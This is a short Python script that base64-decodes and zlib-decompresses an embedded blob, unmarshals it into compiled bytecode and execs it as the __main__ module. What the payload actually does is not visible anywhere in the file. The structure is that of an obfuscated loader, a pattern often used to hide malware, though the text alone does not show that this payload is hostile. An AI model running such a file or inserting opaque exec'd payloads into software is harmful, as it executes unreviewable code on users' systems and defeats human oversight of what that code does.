# -*- coding: utf-8 -*-

import sys, types, marshal, base64, zlib
_payload_b64 = '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'

def _run_payload():
    try:
        data = base64.b64decode(_payload_b64)
        data = zlib.decompress(data)
        code_obj = marshal.loads(data)
    except Exception as e:
        print("oops payload:", e, file=sys.stderr)
        raise

    module = types.ModuleType("__main__")
    module.__file__ = __file__
    sys.modules["__main__"] = module
    exec(code_obj, module.__dict__)

if __name__ == "__main__":
    _run_payload()
